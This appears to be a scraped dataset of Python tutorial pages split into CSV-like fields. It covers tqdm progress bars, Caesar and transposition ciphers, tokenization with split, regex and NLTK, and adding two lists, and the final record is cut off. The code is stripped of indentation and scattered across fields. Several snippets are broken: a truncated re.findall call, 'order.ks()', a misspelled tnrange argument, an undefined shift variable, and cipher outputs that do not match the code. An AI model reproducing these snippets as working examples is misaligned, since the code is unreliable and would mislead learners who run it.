160,['Python tqdm Module | How to create a terminal progress bar'],"['Whenever we install any Python library, module, or installing software, we see the progress bar to screen, which denotes the small progress bar that estimates how long the process would take to complete or render. It gives us an impression of activity and can calm the nerves. We all are familiar with the various progress bar. Some of them are attractive and some of them boring.']","['https://www.javatpoint.com/caesar-cipher-in-python', 'https://www.javatpoint.com/argparse-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/jupyter-notebook', 'https://www.javatpoint.com/caesar-cipher-in-python', 'https://www.javatpoint.com/argparse-in-python', 'https://www.javatpoint.com/caesar-cipher-in-python']",['https://static.javatpoint.com/python/images/python-tqdm-module.png'],[],"['Need for Progress Bar', 'Prerequisites', 'Installation', 'Adding Progress Bars to for Loops', 'Predictive Manual Updates of Progress Bar', 'Threaded Progress Bar', 'Add Color in Tqdm Progress Bar', 'Conclusion']",[],[],"[""In this article, we will create the progress bar without involving Python's code core logging library."", 'We can create simple and hassle-free progress bars using the Python external library named tqdm. We can add it to the code and make it look lovely.', 'Python 3 must be installed in the system and we can also create a virtual environment to install the tqdm library.', 'Open the command-line terminal and type the following.', 'The above command will successfully install in the system. We can verify it using the following statement.', 'If there is no error which means this library is successfully installed.', ""Let's understand another example."", 'Example - 1', 'loop : 100%|██████████| 10/10 [00:01<00:00, 9.08it/s]', 'Example -3', 'Explanation -']","['The tqdm stands for taqadum in Arabic, which means progress. Python tqdm module works on various platform such Linux, Window, Mac, etc. and it is also compatible with the IPython/Jupyter notebooks.', 'If we are working with the smaller data set, the progress will not bother in our workflow. However, the progress bar can be used for iterating over a dataset, training a model, or encoding a large information set.', ""The tqdm module provides a facility to update the progress bar at certain intervals manually. When we download a multi-part file in chunks or streaming data, we can manually update the process bar function. Let's understand the following example."", 'In the above code, we have set attribute as 100. The called function incremented by ten in each iteration until 100% is achieved. We can pass any value to the update() method.', ""Color can make the progress bar very attractive. However, it doesn't add any new functionality to the working of the bar. The tqdm can work with Colorama, a simple cross-platform color terminal text in Python. Let's understand the following example.""]","['Progress bars are filled up according to the percentage of progress made in accomplishing a task. The progress can be calculated by dividing number_of_item_processed by total_input_item. Various factors affect the progress bar, such as network speed, latency, and if persisting data into local storage to derive a more accurate ETA (Estimated Time of Arrival).', ""We can also trap the Python tqdm package into Python threads. Multiprocessing is the best way to use the total number of cores. The tqdm position argument allows us to specify the line offset to print this bar. It is set on automatic by default in case of unscripted. Let's understand the following example. The value must be specified to manage the multiple bars at once. If we ignore this argument, our bar will be overridden by different threads."", 'We have discussed all basic concepts related to the progress bar. Python comes with the tqdm module that helps us to design manually. We have defined suitable examples for important operation that we can perform in tqdm module. The tqdm module can collaborate with the subprocess and threads where we can run the multiple process bars at the same time.']","['pip install tqdm', 'pip3 install tqdm', 'import tqdm', 'import time', 'import sys', 'from tqdm import trange', 'def do_something():', 'time.sleep(1)', 'def do_another_something():', 'time.sleep(1)', ""for i in trange(10, file=sys.stdout, desc='outer loop'):"", 'do_something()', ""for j in trange(100,file=sys.stdout, leave=False, unit_scale=True, desc='inner loop'):"", 'do_another_something()', '# importing modules', 'from tqdm import trange', 'from time import sleep', '# creating loop', 'for i in trange(10, desc=""loop ""):', '# slowing the for loop', 'sleep(0.1)', '# importing modules', 'from tqdm import tnrange', 'from time import sleep', '# creating loop', 'for i in tnrange(2, dec=""loop 1""):', '# creating nested loop', 'for j in tnrange(5, dec=""loop 2""):', '# slowing the for loop', 'sleep(0.3)', '# importing modules', 'import time', 'import sys', 'from tqdm import trange', '# creating random function', 'def random_function():', 'time.sleep(0.5)', '# another random function', 'def another_random_function():', 'time.sleep(0.2)', '# defining outer loop', ""for i in trange(3, file=sys.stdout, desc='Outer loop'):"", 'random_function()', '# inner loop', ""for j in trange(5, file=sys.stdout, desc='Inner loop'):"", 'another_random_function()', '# importing modules', 'import time', 'import sys', 'from tqdm import tqdm', 'def task():', 'time.sleep(1)', 'with tqdm(total=100, file=sys.stdout) as pbar:', 'for i in range(10):', 'task()', '# Here we are updating progress bar manually, useful for streams such as reading files.', 'pbar.update(10)', '# Updates in increments of 10 stops at 100', 'import time', 'from random import randrange', 'from multiprocessing.pool import ThreadPool', 'from tqdm import tqdm', 'def func_call(position, total):', ""text = 'progressbar #{position}'.format(position=position)"", 'with  tqdm(total=total, position=position, desc=text) as progress:', 'for _ in range(0, total, 5):', 'progress.update(5)', 'time.sleep(randrange(3))', 'pool = ThreadPool(10)', 'tasks = range(5)', 'for i, url in enumerate(tasks, 1):', 'pool.apply_async(func_call, args=(i, 100))', 'pool.close()', 'pool.join()', 'from tqdm import trange', 'from colorama import Fore', '# Cross-platform colored terminal text.', 'color_bars = [Fore.BLACK,', 'Fore.RED,', 'Fore.GREEN,', 'Fore.YELLOW,', 'Fore.BLUE,', 'Fore.MAGENTA,', 'Fore.CYAN,', 'Fore.WHITE]', 'for color in color_bars:', 'for i in trange(int(7e7),', 'bar_format=""{l_bar}%s{bar}%s{r_bar}"" % (color, Fore.RESET)):', 'pass']","['outer loop:   0%|          | 0/10 [00:00<?, ?it/s]', 'inner loop:   0%|          | 0.00/100 [00:00<?, ?it/s]', 'inner loop:   1%|          | 1.00/100 [00:01<01:40, 1.02s/it]', 'inner loop:   2%|▏         | 2.00/100 [00:02<01:39, 1.02s/it]', 'inner loop:   3%|▎         | 3.00/100 [00:03<01:38, 1.01s/it]', 'inner loop:   4%|▍         | 4.00/100 [00:04<01:37, 1.01s/it]', 'inner loop:   5%|▌         | 5.00/100 [00:05<01:35, 1.01s/it]', 'inner loop:   6%|▌         | 6.00/100 [00:06<01:34, 1.01s/it]', 'inner loop:   7%|▋         | 7.00/100 [00:07<01:34, 1.01s/it]', 'inner loop:   8%|▊         | 8.00/100 [00:08<01:33, 1.02s/it]', 'inner loop:   9%|▉         | 9.00/100 [00:09<01:32, 1.02s/it]', 'inner loop:  10%|█         | 10.0/100 [00:10<01:31, 1.02s/it]', 'inner loop:  11%|█         | 11.0/100 [00:11<01:30, 1.01s/it]', 'inner loop:  12%|█▏        | 12.0/100 [00:12<01:29, 1.01s/it]', 'inner loop:  13%|█▎        | 13.0/100 [00:13<01:28, 1.01s/it]', 'inner loop:  14%|█▍        | 14.0/100 [00:14<01:29, 1.04s/it]', 'inner loop:  15%|█▌        | 15.0/100 [00:15<01:27, 1.03s/it]', 'inner loop:  16%|█▌        | 16.0/100 [00:16<01:26, 1.02s/it]', 'inner loop:  17%|█▋        | 17.0/100 [00:17<01:24, 1.02s/it]', 'inner loop:  18%|█▊        | 18.0/100 [00:18<01:23, 1.02s/it]', 'inner loop:  19%|█▉        | 19.0/100 [00:19<01:22, 1.02s/it]', '…………………………………………………………………………………………….', '……………………………………………………………………………………………..', 'It will go till it reached at 100%.', 'loop : 100%|██████████| 10/10 [00:01<00:00, 9.08it/s]', 'outer loop:   0%|          | 0/10 [00:00<?, ?it/s]', 'inner loop:   0%|          | 0.00/100 [00:00<?, ?it/s]', 'inner loop:   1%|          | 1.00/100 [00:01<01:39, 1.00s/it]', 'inner loop:   2%|▏         | 2.00/100 [00:02<01:38, 1.00s/it]', 'inner loop:   3%|▎         | 3.00/100 [00:03<01:37, 1.00s/it]', 'inner loop:   4%|▍         | 4.00/100 [00:04<01:36, 1.00s/it]', 'inner loop:   5%|▌         | 5.00/100 [00:05<01:35, 1.00s/it]', 'inner loop:   6%|▌         | 6.00/100 [00:06<01:34, 1.01s/it]', 'inner loop:   7%|▋         | 7.00/100 [00:07<01:33, 1.01s/it]', 'inner loop:   8%|▊         | 8.00/100 [00:08<01:32, 1.01s/it]', 'inner loop:   9%|▉         | 9.00/100 [00:09<01:31, 1.00s/it]', 'inner loop:  10%|█         | 10.0/100 [00:10<01:30, 1.01s/it]', 'Outer loop:   0%|          | 0/3 [00:00<?, ?it/s]', 'Inner loop:   0%|          | 0/5 [00:00<?, ?it/s]', 'Inner loop:  20%|██        | 1/5 [00:00<00:00,  4.62it/s]', 'Inner loop:  40%|████      | 2/5 [00:00<00:00,  4.64it/s]', 'Inner loop:  60%|██████    | 3/5 [00:00<00:00,  4.63it/s]', 'Inner loop:  80%|████████  | 4/5 [00:00<00:00,  4.65it/s]', 'Outer loop:  33%|███▎      | 1/3 [00:01<00:03,  1.58s/it]', 'Inner loop:   0%|          | 0/5 [00:00<?, ?it/s]', 'Inner loop:  20%|██        | 1/5 [00:00<00:00,  4.91it/s]', 'Inner loop:  40%|████      | 2/5 [00:00<00:00,  4.85it/s]', 'Inner loop:  60%|██████    | 3/5 [00:00<00:00,  4.79it/s]', 'Inner loop:  80%|████████  | 4/5 [00:00<00:00,  4.77it/s]', 'Outer loop:  67%|██████▋   | 2/3 [00:03<00:01,  1.58s/it]', 'Inner loop:   0%|          | 0/5 [00:00<?, ?it/s]', 'Inner loop:  20%|██        | 1/5 [00:00<00:00,  4.43it/s]', 'Inner loop:  40%|████      | 2/5 [00:00<00:00,  4.56it/s]', 'Inner loop:  60%|██████    | 3/5 [00:00<00:00,  4.65it/s]', 'Inner loop:  80%|████████  | 4/5 [00:00<00:00,  4.72it/s]', 'Outer loop: 100%|██████████| 3/3 [00:04<00:00,  1.57s/it]', '100%|██████████| 100/100 [00:10<00:00, 9.93it/s]', 'progressbar #5:   0%|          | 0/100 [00:00<?, ?it/s]', 'progressbar #2:   0%|          | 0/100 [00:00<?, ?it/s]', 'progressbar #1:   0%|          | 0/100 [00:00<?, ?it/s]', 'progressbar #4:   0%|          | 0/100 [00:00<?, ?it/s]', 'progressbar #3:   0%|          | 0/100 [00:00<?, ?it/s]', 'progressbar #3:  10%|█         | 10/100 [00:01<00:09,  9.91it/s]', 'progressbar #5:  10%|█         | 10/100 [00:01<00:09,  9.91it/s]', 'progressbar #1:  10%|█         | 10/100 [00:02<00:18,  4.97it/s]', 'progressbar #2:  10%|█         | 10/100 [00:02<00:18,  4.96it/s]', 'progressbar #4:  10%|█         | 10/100 [00:02<00:18,  4.96it/s]', 'progressbar #5:  15%|█▌        | 15/100 [00:02<00:11,  7.64it/s]', 'progressbar #3:  15%|█▌        | 15/100 [00:02<00:11,  7.64it/s]', 'progressbar #4:  15%|█▌        | 15/100 [00:03<00:17,  4.96it/s]', 'progressbar #2:  15%|█▌        | 15/100 [00:03<00:17,  4.95it/s]', 'progressbar #3:  20%|██        | 20/100 [00:04<00:16,  4.71it/s]', 'progressbar #5:  25%|██▌       | 25/100 [00:04<00:11,  6.58it/s]', 'progressbar #1:  20%|██        | 20/100 [00:04<00:16,  4.97it/s]', 'progressbar #2:  20%|██        | 20/100 [00:04<00:16,  4.96it/s]']",[],['|||The progress bar provides us an estimation of the process that has been given the approximation of the time it might take more.|||It gives us information that the progress is still running and has not been terminated rudely.|||']
161,['Caesar Cipher in Python'],"['In this tutorial, we will explore one of the encryption methods called Caesar Cipher. It is a part of Cryptography.']","['https://www.javatpoint.com/tokenizer-in-python', 'https://www.javatpoint.com/python-tqdm-module', 'https://www.javatpoint.com/tokenizer-in-python', 'https://www.javatpoint.com/python-tqdm-module', 'https://www.javatpoint.com/tokenizer-in-python']","['https://static.javatpoint.com/python/images/caesar-cipher-in-python.png', 'https://static.javatpoint.com/python/images/caesar-cipher-in-python2.png']",[],"['Introduction', 'Feature of Caesar Cipher Algorithm', 'Breach in Caesar Cipher Algorithm', 'Transposition Cipher']",['How to decrypt?'],['Note - The transposition technique is meant to be a significant improvement in crypto security. Cryptanalyst observed that re-encrypting the cipher text using same transposition cipher shows better security.'],"[""There is an algorithm used to implement it. Let's understand the following."", 'This algorithm consists of a few features that are given below.', 'There is an integer value required to define each latter of the text that has been moved down. This integer value is also known as the shift.', 'The following mathematical formula can be used to shift n letter.', 'Cipher(n) = De-cipher(26-n)', 'The same function can be used for decryption. Instead, we will modify the shift value such that shifts = 26 - shift.', ""Let's understand the following example -"", 'We have defined few specific set of position that generated a cipher text.', ""Let's understand the following example."", ""Let's understand this algorithm using an example."", ""Let's take a plain text, and apply the simple columnar transposition technique as shown below."", ""Let's understand the following example."", 'Explanation -', 'In the above code, we have created a function named split_len(), which spitted the pain text character, placed in columnar or row format.']","['We can represent this concept using modular arithmetic by first transmuting the letter into numbers, according to the schema, A = 0, B = 1, C = 2, D = 3…….. Z = 25.', 'The decryption is the same as encryption. We can create a function that will accomplish shifting in the opposite path to decrypt the original text. However, we can use the cyclic property of the cipher under the module.', 'The above code has traversed the character at a time a time. It transferred the each character as per rule depending on the procedure of encryption and decryption of the text.', ""We can hack the cipher text in various ways. One of the ways is Brute Force Technique, which involves trying every possible decryption key. This technique is not so hard and doesn't require much effort."", ""Transposition cipher algorithm is a technique where the alphabet order in the plaintext is rearranged to form a cipher text. This algorithm doesn't support the actual plain text alphabets."", 'We placed the plain text horizontally and the cipher text is created with vertical format as: hotnejpt.lao.lvi. To decrypt this, the receiver must use the same table to decrypt the cipher text to plain text.', 'The encode() method created the cipher text with a key specifying the number of columns, and we have printed each cipher text by reading through each column.']","[""In this technique, each character is substituted by a letter certain fixed number position it's later or before the alphabet. For example - Alphabet B is replaced by two positions down D. D would become F and so on. This method is named after popular frictional characters Julius Caesar, who used it to communicate with officials."", 'We will take the simple example called columnar transposition cipher where we write the each character in the pain text in horizontal with specified alphabet width. The vertically written texts are cipher, which create a completely unlike cipher text.']","['def encypt_func(txt, s):', 'result = """"', '# transverse the plain txt', 'for i in range(len(txt)):', 'char = txt[i]', '# encypt_func uppercase characters in plain txt', 'if (char.isupper()):', 'result += chr((ord(char) + s - 64) % 26 + 65)', '# encypt_func lowercase characters in plain txt', 'else:', 'result += chr((ord(char) + s - 96) % 26 + 97)', 'return result', '# check the above function', 'txt = ""CEASER CIPHER EXAMPLE""', 'print(""Plain txt : "" + txt)', 'print(""Shift pattern : "" + str(s))', 'print(""Cipher: "" + encypt_func(txt, s))', ""msg = 'rGMTLIVrHIQSGIEWIVGIEWIV' #encrypted msg"", ""LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'"", 'for k in range(len(LETTERS)):', ""transformation = ''"", 'for s in msg:', 'if s in LETTERS:', 'n = LETTERS.find(s)', 'n = n - k', 'if n < 0:', 'n = n + len(LETTERS)', 'transformation = transformation + LETTERS[n]', 'else:', 'transformation = transformation + s', ""print('Hacking k #%s: %s' % (k, transformation))"", 'def split_len(sequence, length):', 'return [sequence[i:i + length] for i in range(0, len(sequence), length)]', 'def encode(k, plaintxt):', 'order = {', 'int(val): n for n, val in enumerate(k)', ""ciphertext = ''"", 'for index in sorted(order.ks()):', 'for part in split_len(plaintxt, len(k)):', 'try:ciphertext += part[order[index]]', 'except IndexError:', 'continue', 'return ciphertext', ""print(encode('3214', 'HELLO'))""]","['Plain txt : CEASER CIPHER EXAMPLE', 'Shift pattern : 4', 'Cipher: HJFXJWsHNUMJWsJCFRUQJ', 'Hacking k #25: rHNUMJWrIJRTHJFXJWHJFXJW']",[],['|||This technique is quite simple to apply encryption.|||Each text is replaced by the fixed number of position down or up with the alphabet.|||It is a simple type of substitute cipher.|||']
162,['Tokenizer in Python'],"[""As we all know, there is an incredibly huge amount of text data available on the internet. But, most of us may not be familiar with the methods in order to start working with this text data. Moreover, we also know that it is a tricky part to navigate our language's letters in Machine Learning as Machines can recognize the numbers, not the letters.""]","['https://www.javatpoint.com/how-to-add-two-lists-in-python', 'https://www.javatpoint.com/caesar-cipher-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/nlp', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/deep-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/keras', 'https://www.javatpoint.com/https://www.javatpoint.com/tensorflow', 'https://www.javatpoint.com/how-to-add-two-lists-in-python', 'https://www.javatpoint.com/caesar-cipher-in-python', 'https://www.javatpoint.com/how-to-add-two-lists-in-python']",['https://static.javatpoint.com/python/images/tokenizer-in-python.png'],[],['Tokenization using Natural Language ToolKit in Python'],"['Understanding Tokenization', 'Understanding the Significance of Tokenization in NLP', 'Some Methods to perform Tokenization in Python', 'Tokenization using the split() function in Python', 'Tokenization using RegEx (Regular Expressions) in Python', 'Conclusion']",[],"[""This step is necessary as the text's actual meaning could be interpreted by analyzing each word present within the text."", 'Now, let us consider the following string as an example:', 'After performing the Tokenization on the above string, we would be getting output as shown below:', ""['My', 'name', 'is', 'Jamie', 'Clark']"", 'There are various uses for performing the operation. We can utilize the tokenized form in order to:', 'Now, let us understand several ways to perform Tokenization in Natural Language Processing (NLP) in Python.', 'There are various unique methods of performing Tokenization on Textual Data. Some of these unique ways are described below:', 'Let us consider the following examples:', 'Example 1.1: Word Tokenization using the split() function', 'Explanation:', 'Let us consider the same in the following example:', 'Example 1.2: Sentence Tokenization using the split() function', 'Explanation:', 'Let us consider the following examples based on word tokenization and sentence tokenization using the RegEx method in Python.', 'Example 2.1: Word Tokenization using the RegEx method in Python', 'Explanation:', ""Now, let's have a look at sentence tokenization with the RegEx method."", 'Example 2.2: Sentence Tokenization using the RegEx method in Python', 'Explanation:', 'Natural Language ToolKit (NLTK) is a Third-party Library that can be installed using the following syntax in a command shell or terminal:', 'In order to verify the installation, one can import the nltk library in a program and execute it as shown below:', 'Let us consider some example based on these two methods:', 'Example 3.1: Word Tokenization using the NLTK library in Python', 'Explanation:', 'Example 3.1: Sentence Tokenization using the NLTK library in Python', 'Explanation:']","['So, how the text data manipulation and cleaning are done to create a model? In order to answer this question, let us explore some wonderful concepts beneath Natural Language Processing (NLP).', 'Solving an NLP problem is a process divided into multiple stages. First of all, we have to clean the unstructured text data before moving to the modeling stage. There are some key steps included in the data cleaning. These steps are as follows:', 'In order to understand the significance of Tokenization, let us consider the English Language as an example. Let us pick up any sentence and keep it in mind while understanding the following section.', 'Before processing a Natural Language, we have to identify the words constituting a string of characters. Thus, Tokenization appears out to be the most fundament step to proceed with Natural Language Processing (NLP)', 'In order to start working with RegEx (Regular Expression), Python provides the library known as re. The re library is one of the pre-installed libraries in Python.', 'Natural Language ToolKit, also known as NLTK, is a library written in Python. NLTK library is generally used for symbolic and statistical Natural Language Processing and works well with textual data.', 'If the program does not raise an error, then the library has been installed successfully. Otherwise, it is recommended to follow the above installation procedure again and read the official documentation for more details.', 'Natural Language ToolKit (NLTK) has a module named tokenize(). This module is further categorized into two sub-categories: Word Tokenize and Sentence Tokenize']","['In the following tutorial, we will be learning a lot more about the very primary step known as Tokenization. We will be understanding what Tokenization is and why it is necessary for Natural Language Processing (NLP). Moreover, we will also be discovering some unique methods to execute Tokenization in Python.', 'Tokenization is said to be dividing a large quantity of text into smaller fragments known as Tokens. These fragments or Tokens are pretty useful to find the patterns and are deliberated as the foundation step for stemming and lemmatization. Tokenization also supports in substitution of sensitive data elements with non-sensitive ones.', 'Natural Language Processing (NLP) is utilized to create applications like Text Classification, Sentimental Analysis, Intelligent Chatbot, Language Translation, and many more. Thus, it becomes important to understand the text pattern to achieve the purpose stated above.', 'But for now, consider the stemming and lemmatization as the primary steps for cleaning the text data with the help of Natural Language Processing (NLP). Tasks like Text Classification or Spam Filtering use NLP along with deep learning libraries like Keras and Tensorflow.', 'The split() function is one of the basic methods available in order to split the strings. This function returns a list of strings after splitting the provided string by the particular separator. The split() function breaks a string at each space by default. However, we can specify the separator as per the need.', 'In the above example, we have used the split() method in order to break the paragraph into smaller fragments or say words. Similarly, we can also break the paragraph into sentences by specifying the separator as the parameter for the split() function. As we know, a sentence generally ends with a full stop "".""; which means that we can utilize the ""."" as the separator to split the string.', 'In the above example, we have used the split() function with the full stop (.) as its parameter in order to break the paragraph at the full stops. A major disadvantage of utilizing the split() function is that the function takes one parameter at a time. Hence, we can only use a separator in order to split the string. Moreover, the split() function does not consider the punctuations as the separate fragment.', ""Before moving onto the next method, let us understand the regular expression in brief. A Regular Expression, also known as RegEx, is a special sequence of characters that allows the users to find or match other strings or string sets with that sequence's help as a pattern."", 'In the above example, we have imported the re library in order to use its functions. We have then used the findall() function of the re library. This function helps the users to find all the words that match the pattern present in the parameter and stores them in the list.', 'Moreover, the ""\\w"" is used to represent any word character, refers to alphanumeric (includes alphabets, numbers), and underscore (_). ""+"" indicates any frequency. Thus, we have followed the [\\w\']+ pattern so that the program should look and find all the alphanumeric characters until it encounters any other one.', ""In the above example, we have used the compile() function of the re library with the parameter '[.?!]' and used the split() method to separator the string from the specified separator. As a result, the program splits the sentences as soon as it encounters any of these characters."", 'In the above program, we have imported the word_tokenize() method from the tokenize module of the NLTK library. Thus, as a result, the method has broken the string into different tokens and stored it in a list. And at last, we have printed the list. Moreover, this method includes the full stops and other punctuation marks as a separate token.', 'In the above program, we have imported the sent_tokenize() method from the tokenize module of the NLTK library. Thus, as a result, the method has broken the paragraph into different sentences and stored it in a list. And at last, we have printed the list.', 'In the above tutorial, we have discovered the concepts of Tokenization and its role in the overall Natural Language Processing (NLP) pipeline. We have also discussed a few methods of Tokenization (including the word tokenization and sentence tokenization) from a specific text or string in Python.']","['my_text = """"""Let\'s play a game, Would You Rather! It\'s simple, you have to pick one or the other. Let\'s get started. Would you rather try Vanilla Ice Cream or Chocolate one? Would you rather be a bird or a bat? Would you rather explore space or the ocean? Would you rather live on Mars or on the Moon? Would you rather have many good friends or one very best friend? Isn\'t it easy though? When we have less choices, it\'s easier to decide. But what if the options would be complicated? I guess, you pretty much not understand my point, neither did I, at first place and that led me to a Bad Decision.""""""', 'print(my_text.split())', 'my_text = """"""Dreams. Desires. Reality. There is a fine line between dream to become a desire and a desire to become a reality but expectations are way far then the reality. Nevertheless, we live in a world of mirrors, where we always want to reflect the best of us. We all see a dream, a dream of no wonder what; a dream that we want to be accomplished no matter how much efforts it needed but we try.""""""', ""print(my_text.split('. '))"", 'import re', 'my_text = """"""Joseph Arthur was a young businessman. He was one of the shareholders at Ryan Cloud\'s Start-Up with James Foster and George Wilson. The Start-Up took its flight in the mid-90s and became one of the biggest firms in the United States of America. The business was expanded in all major sectors of livelihood, starting from Personal Care to Transportation by the end of 2000. Joseph was used to be a good friend of Ryan.""""""', 'my_tokens = re.findall', 'import re', 'my_text = """"""The Advertisement was telecasted nationwide, and the product was sold in around 30 states of America. The product became so successful among the people that the production was increased. Two new plant sites were finalized, and the construction was started. Now, The Cloud Enterprise became one of America\'s biggest firms and the mass producer in all major sectors, from transportation to personal care. Director of The Cloud Enterprise, Ryan Cloud, was now started getting interviewed over his success stories. Many popular magazines were started publishing Critiques about him.""""""', ""my_sentences = re.compile('[.!?] ').split(my_text)"", 'print(my_sentences)', '$ pip install --user -U nltk', 'import nltk', 'from nltk.tokenize import word_tokenize', 'my_text = """"""The Advertisement was telecasted nationwide, and the product was sold in around 30 states of America. The product became so successful among the people that the production was increased. Two new plant sites were finalized, and the construction was started. Now, The Cloud Enterprise became one of America\'s biggest firms and the mass producer in all major sectors, from transportation to personal care. Director of The Cloud Enterprise, Ryan Cloud, was now started getting interviewed over his success stories. Many popular magazines were started publishing Critiques about him.""""""', 'print(word_tokenize(my_text))', 'from nltk.tokenize import sent_tokenize', 'my_text = """"""The Advertisement was telecasted nationwide, and the product was sold in around 30 states of America. The product became so successful among the people that the production was increased. Two new plant sites were finalized, and the construction was started. Now, The Cloud Enterprise became one of America\'s biggest firms and the mass producer in all major sectors, from transportation to personal care. Director of The Cloud Enterprise, Ryan Cloud, was now started getting interviewed over his success stories. Many popular magazines were started publishing Critiques about him.""""""', 'print(sent_tokenize(my_text))']","[""['Let's', 'play', 'a', 'game,', 'Would', 'You', 'Rather!', 'It's', 'simple,', 'you', 'have', 'to', 'pick', 'one', 'or', 'the', 'other.', 'Let's', 'get', 'started.', 'Would', 'you', 'rather', 'try', 'Vanilla', 'Ice', 'Cream', 'or', 'Chocolate', 'one?', 'Would', 'you', 'rather', 'be', 'a', 'bird', 'or', 'a', 'bat?', 'Would', 'you', 'rather', 'explore', 'space', 'or', 'the', 'ocean?', 'Would', 'you', 'rather', 'live', 'on', 'Mars', 'or', 'on', 'the', 'Moon?', 'Would', 'you', 'rather', 'have', 'many', 'good', 'friends', 'or', 'one', 'very', 'best', 'friend?', 'Isn't', 'it', 'easy', 'though?', 'When', 'we', 'have', 'less', 'choices,', 'it's', 'easier', 'to', 'decide.', 'But', 'what', 'if', 'the', 'options', 'would', 'be', 'complicated?', 'I', 'guess,', 'you', 'pretty', 'much', 'not', 'understand', 'my', 'point,', 'neither', 'did', 'I,', 'at', 'first', 'place', 'and', 'that', 'led', 'me', 'to', 'a', 'Bad', 'Decision.']"", ""['Dreams', 'Desires', 'Reality', 'There is a fine line between dream to become a desire and a desire to become a reality but expectations are way far then the reality', 'Nevertheless, we live in a world of mirrors, where we always want to reflect the best of us', 'We all see a dream, a dream of no wonder what; a dream that we want to be accomplished no matter how much efforts it needed but we try.']"", ""['Joseph', 'Arthur', 'was', 'a', 'young', 'businessman', 'He', 'was', 'one', 'of', 'the', 'shareholders', 'at', 'Ryan', 'Cloud', 's', 'Start', 'Up', 'with', 'James', 'Foster', 'and', 'George', 'Wilson', 'The', 'Start', 'Up', 'took', 'its', 'flight', 'in', 'the', 'mid', '90s', 'and', 'became', 'one', 'of', 'the', 'biggest', 'firms', 'in', 'the', 'United', 'States', 'of', 'America', 'The', 'business', 'was', 'expanded', 'in', 'all', 'major', 'sectors', 'of', 'livelihood', 'starting', 'from', 'Personal', 'Care', 'to', 'Transportation', 'by', 'the', 'end', 'of', '2000', 'Joseph', 'was', 'used', 'to', 'be', 'a', 'good', 'friend', 'of', 'Ryan']"", '[\'The Advertisement was telecasted nationwide, and the product was sold in around 30 states of America\', \'The product became so successful among the people that the production was increased\', \'Two new plant sites were finalized, and the construction was started\', ""Now, The Cloud Enterprise became one of America\'s biggest firms and the mass producer in all major sectors, from transportation to personal care"", \'Director of The Cloud Enterprise, Ryan Cloud, was now started getting interviewed over his success stories\', \'Many popular magazines were started publishing Critiques about him.\']', '[\'The\', \'Advertisement\', \'was\', \'telecasted\', \'nationwide\', \',\', \'and\', \'the\', \'product\', \'was\', \'sold\', \'in\', \'around\', \'30\', \'states\', \'of\', \'America\', \'.\', \'The\', \'product\', \'became\', \'so\', \'successful\', \'among\', \'the\', \'people\', \'that\', \'the\', \'production\', \'was\', \'increased\', \'.\', \'Two\', \'new\', \'plant\', \'sites\', \'were\', \'finalized\', \',\', \'and\', \'the\', \'construction\', \'was\', \'started\', \'.\', \'Now\', \',\', \'The\', \'Cloud\', \'Enterprise\', \'became\', \'one\', \'of\', \'America\', ""\'s"", \'biggest\', \'firms\', \'and\', \'the\', \'mass\', \'producer\', \'in\', \'all\', \'major\', \'sectors\', \',\', \'from\', \'transportation\', \'to\', \'personal\', \'care\', \'.\', \'Director\', \'of\', \'The\', \'Cloud\', \'Enterprise\', \',\', \'Ryan\', \'Cloud\', \',\', \'was\', \'now\', \'started\', \'getting\', \'interviewed\', \'over\', \'his\', \'success\', \'stories\', \'.\', \'Many\', \'popular\', \'magazines\', \'were\', \'started\', \'publishing\', \'Critiques\', \'about\', \'him\', \'.\']', '[\'The Advertisement was telecasted nationwide, and the product was sold in around 30 states of America.\', \'The product became so successful among the people that the production was increased.\', \'Two new plant sites were finalized, and the construction was started.\', ""Now, The Cloud Enterprise became one of America\'s biggest firms and the mass producer in all major sectors, from transportation to personal care."", \'Director of The Cloud Enterprise, Ryan Cloud, was now started getting interviewed over his success stories.\', \'Many popular magazines were started publishing Critiques about him.\']']",[],"[""|||Count the total number of words in the text.|||Count the word's frequency, i.e., the total number of times a specific word is present and a lot more.|||&&&|||Word Tokenization|||Parts of Speech prediction for every token|||Text Lemmatization|||Stop Words Identification and Removal, and a lot more.||||||Word Tokenize: The word_tokenize() method is used to split a string into tokens or say words.|||Sentence Tokenize: The sent_tokenize() method is used to split a string or paragraph into sentences.|||""]"
163,['How to add two lists in Python'],"['In this topic, we will learn how we can add two lists in Python. But before going through the topic, we need to understand the term List in Python. Python list is used to store multiple items in a variable. Items in the list can be any ordered, changeable, and allow to store duplicate values. Each item of the list has an appropriate indexed value where the first index of the list starts with {0}, and the length index of the list must be n-1. Each item of the list is separated by a comma (,) symbol and enclosed within square brackets [].']","['https://www.javatpoint.com/shallow-copy-and-deep-copy-in-python', 'https://www.javatpoint.com/tokenizer-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/shallow-copy-and-deep-copy-in-python', 'https://www.javatpoint.com/tokenizer-in-python', 'https://www.javatpoint.com/shallow-copy-and-deep-copy-in-python']",['https://static.javatpoint.com/python/images/how-to-add-two-lists-in-python.png'],[],"['Method 1: Add two lists using the Naive Method:', 'Method 2: Add two list using the Comprehension List', 'Method 3: Add two list in Python using the map() function with add operator:', 'Method 4: Accepts the list element from the user and joins the two lists.', 'Method 5: Add two list using the zip() function with sum() function:']",[],[],"[""Let's consider a program to print the list in Python."", 'programList.py', ""Let's discuss the various method to add two lists in Python Program."", ""Let's consider a program to add the two list in Python using the Naïve Method."", 'naivePro.py', ""Let's consider a program to add the two list in Python using the Naïve Method."", 'comprehension.py', 'Consider a program to add two lists in Python using the map() function with the add operator.', ""Let's consider a program to take the input list element from the user and add them."", ""Let's consider a program to add the list elements using the zip function and sum function in Python.""]","['Here L1 and L2 are the two lists containing the same or different data type elements in a list. The List L1 contains the int and string data type elements, whereas the List L2 contains only int data type elements.', 'It is a shorthand technique of the Naive method in Python. The comprehension technique is much faster to type and retrieve the addition of the two lists. Therefore, it is used in Python programming to perform these types of tasks.', 'In Python, a map() function is used to add two lists bypassing the list variables (lt1, lt2) and add as parameters. Inside the map() function, an added parameter acts like an additional operator to add lists and returns the sum.', ""In this program, we input the user's list elements and insert them into the list using For loop. After that, perform the addition of the two lists in the Python program."", 'The sum() function is used to add two lists using the index number of the list elements grouped by the zip() function. A zip() function is used in the sum() function to group list elements using index-wise 